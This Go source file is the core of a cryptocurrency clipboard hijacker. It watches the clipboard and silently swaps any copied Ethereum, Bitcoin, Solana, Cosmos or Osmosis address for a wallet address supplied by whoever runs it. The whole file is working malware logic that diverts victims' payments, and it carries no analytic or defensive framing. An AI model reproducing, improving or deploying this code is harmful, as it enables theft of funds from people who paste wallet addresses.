package writter

import (
	"fmt"
	"regexp"
	"strings"
	"time"

	"github.com/atotto/clipboard"
)

type WalletTypes struct {
	ETH_WALLET    string
	BTC_WALLET    string
	SOLANA_WALLET string
	COSMOS_WALLET string
	OSMO_WALLET   string
}

func Write(wallets WalletTypes) {
	previousContent, err := clipboard.ReadAll()
	if err != nil {
		fmt.Printf("Error reading clipboard: %v\n", err)
		return
	}

	for {
		currentContent, err := clipboard.ReadAll()
		if err != nil {
			fmt.Printf("Error reading clipboard: %v\n", err)
			continue
		}

		if currentContent != previousContent {
			// ETHEREUM
			if len(currentContent) == 42 && strings.HasPrefix(currentContent, "0x") {
				writeContent(wallets.ETH_WALLET)
				// BITCOIN
			} else if len(currentContent) == 42 && strings.HasPrefix(currentContent, "bc") {
				writeContent(wallets.BTC_WALLET)
				// SOLANA
			} else if len(currentContent) == 44 && containsNumbersAndLetters(currentContent) {
				writeContent(wallets.SOLANA_WALLET)
				// COSMOS
			} else if len(currentContent) == 45 && strings.HasPrefix(currentContent, "cosmos") {
				writeContent(wallets.COSMOS_WALLET)
				// OSMO
			} else if len(currentContent) == 43 && strings.HasPrefix(currentContent, "osmo") {
				writeContent(wallets.OSMO_WALLET)
			}
			previousContent = currentContent
		}
		time.Sleep(500 * time.Millisecond)
	}
}

func containsNumbersAndLetters(content string) bool {
	// Define regular expressions to match numbers, uppercase letters, and lowercase letters
	hasNumber := regexp.MustCompile(`[0-9]`).MatchString(content)
	hasUppercase := regexp.MustCompile(`[A-Z]`).MatchString(content)
	hasLowercase := regexp.MustCompile(`[a-z]`).MatchString(content)
	// Return true if all conditions are met
	return hasNumber && hasUppercase && hasLowercase
}

func writeContent(content string) {
	var newContent = content
	fmt.Printf("Clipboard changed! New content: %s\n", newContent)
	clipboard.WriteAll(newContent)
}
